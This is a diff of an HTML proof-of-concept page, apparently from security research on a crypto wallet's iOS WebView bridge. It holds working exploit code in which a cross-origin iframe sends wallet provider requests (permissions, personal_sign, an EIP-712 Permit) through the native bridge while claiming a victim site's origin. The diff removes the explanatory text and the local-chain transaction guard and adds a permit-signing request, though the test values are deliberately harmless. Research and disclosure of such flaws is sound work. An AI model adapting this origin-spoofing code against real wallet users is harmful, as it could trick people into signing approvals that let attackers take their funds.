@@ -1,166 +1,62 @@
 <!doctype html>
 <meta charset="utf-8">
 <title>Controlled Origin B</title>
-Cross-origin controlled attacker iframe.
-<pre id="status"></pre>
+Controlled cross-origin iframe B.
 <script>
 'use strict';
 
-const status = document.getElementById('status');
-const params = new URLSearchParams(location.search);
-const victimOrigin = params.get('victimOrigin');
-const bridge = window.webkit?.messageHandlers?.ReactNativeWebView;
-const SAFE_TEST_CHAIN_IDS = new Set(['0x7a69', '0x539']);
+const victimOrigin=new URLSearchParams(location.search).get('victimOrigin');
+const bridge=window.webkit?.messageHandlers?.ReactNativeWebView;
 
-function show(text) {
-  status.textContent += text + '\n';
+if(!victimOrigin||new URL(victimOrigin).origin!==victimOrigin)throw new Error('Invalid victimOrigin');
+
+function parentSend(data){parent.postMessage(data,victimOrigin)}
+function address(value){return /^0x[0-9a-fA-F]{40}$/.test(value)}
+function nonce(bytes=12){const a=new Uint8Array(bytes);crypto.getRandomValues(a);return[...a].map(v=>v.toString(16).padStart(2,'0')).join('')}
+function hex(text){return'0x'+[...new TextEncoder().encode(text)].map(v=>v.toString(16).padStart(2,'0')).join('')}
+
+function request(id,method,params,proof){
+  if(!bridge?.postMessage)throw new Error('Core iOS bridge unavailable');
+  bridge.postMessage(JSON.stringify({
+    method:'provider_request',
+    payload:JSON.stringify({id,origin:victimOrigin,request:{method,params}})
+  }));
+  parentSend({type:'SENT',id,proof:{actualOrigin:location.origin,claimedOrigin:victimOrigin,method,...proof}});
 }
 
-function sendParent(data) {
-  parent.postMessage(data, victimOrigin);
-}
+addEventListener('message',event=>{
+  if(event.source!==parent||event.origin!==victimOrigin)return;
+  const {type,id,account,chainId}=event.data||{};
+  try{
+    if(type==='PERMISSIONS')return request(id,'wallet_getPermissions',[],{});
+    if(!address(account))throw new Error('Valid burner account required');
 
-function validAddress(value) {
-  return /^0x[0-9a-fA-F]{40}$/.test(value);
-}
-
-function randomHex(bytes) {
-  const data = new Uint8Array(bytes);
-  crypto.getRandomValues(data);
-  return [...data].map(value => value.toString(16).padStart(2, '0')).join('');
-}
-
-function utf8Hex(value) {
-  return '0x' + [...new TextEncoder().encode(value)]
-    .map(byte => byte.toString(16).padStart(2, '0')).join('');
-}
-
-function postProviderRequest(id, method, requestParams, proof) {
-  if (!bridge?.postMessage) throw new Error('ReactNativeWebView WKScriptMessageHandler unavailable');
-  const wrapper = JSON.stringify({
-    method: 'provider_request',
-    payload: JSON.stringify({
-      id,
-      origin: victimOrigin,
-      request: { method, params: requestParams }
-    })
-  });
-  bridge.postMessage(wrapper);
-  sendParent({ type: 'REQUEST_SENT', id, method, proof });
-}
-
-if (!victimOrigin || new URL(victimOrigin).origin !== victimOrigin) {
-  throw new Error('Invalid victimOrigin: ' + victimOrigin);
-}
-
-show('Actual Origin B: ' + location.origin);
-show('Claimed Origin A: ' + victimOrigin);
-show('iOS raw bridge: ' + Boolean(bridge?.postMessage));
-
-addEventListener('message', event => {
-  if (event.source !== parent || event.origin !== victimOrigin) return;
-  const data = event.data;
-  if (!data?.type) return;
-
-  sendParent({ type: 'TRIGGER_RECEIVED', command: data.type });
-
-  try {
-    if (data.type === 'GET_PERMISSIONS_AS_A') {
-      postProviderRequest(data.id, 'wallet_getPermissions', [], {
-        actualOrigin: location.origin,
-        claimedOrigin: victimOrigin
-      });
-      return;
+    if(type==='PERSONAL'){
+      const challenge=nonce();
+      const message=`CORE CROSS-ORIGIN TEST\nActual sender: ${location.origin}\nClaimed requester: ${victimOrigin}\nNonce: ${challenge}`;
+      return request(id,'personal_sign',[hex(message),account],{account,message});
     }
 
-    if (!validAddress(data.account)) throw new Error('Valid connected burner account required');
-
-    if (data.type === 'PERSONAL_SIGN_AS_A') {
-      const nonce = randomHex(12);
-      const statement = [
-        'CORE CROSS-ORIGIN AUTHORIZATION TEST',
-        'No authentication or asset authorization.',
-        'Actual sender: ' + location.origin,
-        'Claimed requester: ' + victimOrigin,
-        'Nonce: ' + nonce
-      ].join('\n');
-      postProviderRequest(data.id, 'personal_sign', [utf8Hex(statement), data.account], {
-        nonce,
-        statement,
-        account: data.account
-      });
-      return;
-    }
-
-    if (data.type === 'TYPED_DATA_AS_A') {
-      const nonce = '0x' + randomHex(32);
-      const numericChainId = Number.parseInt(String(data.chainId), 16);
-      if (!Number.isSafeInteger(numericChainId)) throw new Error('Invalid chainId');
-      const typedData = {
-        types: {
-          EIP712Domain: [
-            { name: 'name', type: 'string' },
-            { name: 'version', type: 'string' },
-            { name: 'chainId', type: 'uint256' }
-          ],
-          CoreOriginBoundaryTest: [
-            { name: 'statement', type: 'string' },
-            { name: 'actualSender', type: 'string' },
-            { name: 'claimedRequester', type: 'string' },
-            { name: 'nonce', type: 'bytes32' }
-          ]
+    if(type==='PERMIT'){
+      const typedData={
+        types:{
+          EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
+          Permit:[{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]
         },
-        primaryType: 'CoreOriginBoundaryTest',
-        domain: {
-          name: 'Core Origin Boundary Lab',
-          version: '1',
-          chainId: numericChainId
-        },
-        message: {
-          statement: 'Controlled test only. Reject this request.',
-          actualSender: location.origin,
-          claimedRequester: victimOrigin,
-          nonce
-        }
+        primaryType:'Permit',
+        domain:{name:'Controlled Non-Contract Test',version:'1',chainId:Number.parseInt(chainId,16),verifyingContract:account},
+        message:{owner:account,spender:'0x000000000000000000000000000000000000dEaD',value:'1',nonce:'0',deadline:'1'}
       };
-      postProviderRequest(data.id, 'eth_signTypedData_v4', [data.account, JSON.stringify(typedData)], {
-        nonce,
-        account: data.account,
-        typedData
-      });
-      return;
+      return request(id,'eth_signTypedData_v4',[account,JSON.stringify(typedData)],{account,typedData,safety:'expired permit; verifyingContract is the burner EOA; always reject'});
     }
-
-    if (data.type === 'ZERO_TX_AS_A') {
-      if (!SAFE_TEST_CHAIN_IDS.has(String(data.chainId).toLowerCase())) {
-        throw new Error('Transaction test blocked outside the local-development-chain allowlist');
-      }
-      const transaction = {
-        from: data.account,
-        to: data.account,
-        value: '0x0',
-        data: '0x'
-      };
-      postProviderRequest(data.id, 'eth_sendTransaction', [transaction], {
-        instruction: 'REJECT/CANCEL IN CORE',
-        chainId: data.chainId,
-        transaction
-      });
-    }
-  } catch (error) {
-    sendParent({
-      type: 'CHILD_ERROR',
-      id: data.id,
-      message: String(error?.message || error)
-    });
-  }
+  }catch(error){parentSend({type:'ERROR',id,message:error?.message||String(error)})}
 });
 
-sendParent({
-  type: 'READY',
+parentSend({
+  type:'READY',
+  actualOrigin:location.origin,
   victimOrigin,
-  actualOrigin: location.origin,
-  isSubframe: self !== top,
-  bridgeVisible: Boolean(bridge?.postMessage)
+  isSubframe:self!==top,
+  bridgeVisible:Boolean(bridge?.postMessage)
 });
 </script>
